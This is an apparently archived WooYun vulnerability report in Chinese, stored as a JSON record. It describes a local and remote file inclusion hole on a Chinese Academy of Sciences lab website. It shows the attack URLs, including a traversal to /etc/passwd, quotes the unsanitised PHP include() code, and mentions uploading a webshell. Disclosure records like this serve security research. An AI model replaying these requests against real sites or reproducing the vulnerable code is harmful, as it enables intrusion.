{"id": 6802, "wybug_id": "wooyun-2015-0123058", "wybug_title": "中科院某站从文件包含到shell", "wybug_corp": "psych.ac.cn", "wybug_author": "ciz11", "wybug_date": "2015-06-27 11:19", "wybug_open_date": "2015-08-13 10:04", "wybug_type": "重要敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(中国科技网)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取", "远程文件包含"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向公众公开  简要描述： 服务器任意文件读取，远程文件包含 详细说明：  查看该实验室成员信息http://psychling.psych.ac.cn/members/everyone.php?filename=yangyf.php还没有测试就报错了。。\n\n来试试包含etc/passwdfilename=../../../../../../etc/passwd\n\n目测什么防护都没做，毕竟这么老的站。。试试远程文件包含吧http://psychling.psych.ac.cn/members/everyone.php?filename=http://www.baidu.com\n\n不出意外的成功了，再包含个小马，用菜刀砍进去。\n\n\n$filename=$_GET['filename'];\t\tinclude(\"$filename\");\n代码果然一丢丢防护都没有，配置文件也没设置好。website里边有好多小站，但是大部分都已经报废了，只有几个还在。\n\n   漏洞证明：  参见详细说明   修复方案：  改配置，过滤非法字符，访问权限啥的   版权声明：转载请注明来源 ciz11@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-06-29 10:02 厂商回复： 已确认 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}